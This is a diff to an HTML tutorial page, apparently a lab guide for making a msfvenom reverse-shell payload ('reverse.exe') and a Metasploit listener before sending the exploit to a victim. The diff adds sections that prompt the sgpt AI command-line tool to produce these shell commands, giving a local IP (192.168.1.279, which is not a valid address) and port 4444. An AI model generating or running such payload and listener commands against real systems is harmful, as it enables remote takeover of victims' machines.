@@ -15,6 +15,11 @@
     <ul>Click <b>Copy at the bottom of the page</b></ul>
     <ul>Open a Linux terminal and paste the code to create a payload named <b>reverse.exe</b> with msfvenom</ul> 
 </ol></p>
+<h2>Using AI</h2>
+<p>Instead of using the Generator, we can now also use AI:</p>
+<p><ol>
+    <ul>sgpt --chat payload --shell "use msfvenom to create reverse shell exploit using IP 192.168.1.279 and port 4444"</ul>
+</ol></p>
 <h2>Start listener</h2>
 <p><ol>
     <ul>Switch back to the webbrowser</ul>
@@ -22,6 +27,12 @@
     <ul>Click <b>Copy</b></ul>
     <ul>Switch back to the terminal and paste the code to start a Listener in Metasploit</ul>
 </ol></p>
+<h2>Using AI</h2>
+<p>Instead of using the Generator, we can now also use AI:</p>
+<p><ol>
+    <ul>sgpt --chat listener --shell "use metasploit to listen on IP 192.168.1.279 and port 4444"</ul>
+</ol></p>
+
 <p>When the Listener is running and waiting for response, send the exploit to the victim</p>
 
 <h2>Most easy exploit distribution</h2>
